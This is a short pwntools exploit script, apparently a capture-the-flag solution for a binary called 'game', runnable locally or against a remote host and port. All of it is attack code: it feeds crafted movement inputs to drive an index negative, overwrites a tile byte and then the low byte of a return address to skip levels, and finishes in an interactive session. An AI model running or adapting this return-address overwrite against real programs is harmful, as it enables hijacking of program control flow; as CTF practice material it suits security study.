from pwn import *
import sys

if args['REMOTE']:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('./game')
    pause()

def round(ret_lsb):
    log.info("Increase lives left")
    current = 4
    wanted = -4
    buf = 'a' * (current - wanted) 
    buf += 'w' * 3 
    buf += 'w' + 's'
    r.sendline(buf.encode())
    
    log.info("Change tile")
    buf = b'l' + bytes([ret_lsb])
    r.sendline(buf)

    log.info("Overwrite return address to increase level")
    current = wanted
    wanted = -51  # overwrite ret
    buf = b'a' * (current - wanted)
    buf += b'w'
    r.sendline(buf)

for i in range(4):
    round(0x7f)

round(0xfe)

r.interactive()
